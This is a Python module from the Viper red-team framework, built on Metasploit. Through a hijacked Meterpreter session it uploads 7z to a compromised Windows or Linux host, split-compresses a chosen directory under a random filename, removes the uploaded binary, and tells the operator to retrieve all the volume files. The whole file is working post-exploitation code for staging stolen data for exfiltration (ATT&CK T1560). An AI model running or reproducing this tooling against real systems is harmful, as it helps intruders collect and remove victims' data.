# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "分卷压缩目录/文件(7z)"
    DESC_ZH = "分卷压缩目标指定目录/文件"

    NAME_EN = "Sub volume compressed directory / file (7z)"
    DESC_EN = "Volume compression target directory / file."

    MODULETYPE = TAG2TYPE.Collection
    PLATFORM = ["Windows", "Linux"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", "Root"]  # 所需权限
    ATTCK = ["T1560"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1560/003/"]
    README = ["https://www.yuque.com/vipersec/module/ks3bgp"]
    AUTHOR = ["Viper"]
    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionStr(name='TARGET', tag_zh="压缩目录/文件", desc_zh="需要压缩的目录/文件",
                  tag_en="Compression Dir/File", desc_en="Directories / files to be compressed", length=24),
        OptionInt(name='TIMEOUT',
                  tag_zh="超时时间", desc_zh="压缩命令超时时间",
                  tag_en="Time out", desc_en="Compression timeout",
                  default=60 * 10),
        OptionInt(name='SubVolume',
                  tag_zh="分卷大小(m)", desc_zh="每个分卷文件的大小(单位为m)",
                  tag_en="Sub Volume size (m)", desc_en="Size of each sub volume file (unit: m)",
                  min=50, max=100,
                  default=50),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "multi/manage/upload_and_exec_api"
        self.outfile = None

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)

        if session.is_windows:
            self.set_msf_option("LPATH", "7z.exe")
            self.set_msf_option("RPATH", "7z.exe")
        elif session.is_linux:
            self.set_msf_option("LPATH", "7z")
            self.set_msf_option("RPATH", "7z")
        else:
            return False, "模块只支持Windows及Linux原生Session(不支持php/java等类型session)", "This module only supports Meterpreter for Windows and Linux"

        target = self.param("TARGET")
        subvolume = self.param("SubVolume")
        self.outfile = f"{self.random_str(8)}.7z"

        args = f"a -v{subvolume}m {self.outfile} {target}"
        self.set_msf_option("ARGS", args)
        self.set_msf_option("CLEANUP", True)
        self.set_msf_option("TIMEOUT", self.param("TIMEOUT"))

        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return
        self.log_info("模块执行完成", "Module operation completed")
        self.log_good("压缩主文件:", "7z File:")
        self.log_raw(self.outfile)
        self.log_warning("请将压缩主文件及分卷文件全部取回", "Please retrieve all compressed master files and sub volume files")
        self.log_good("命令行输出:", "Console Output")
        self.log_raw(data)
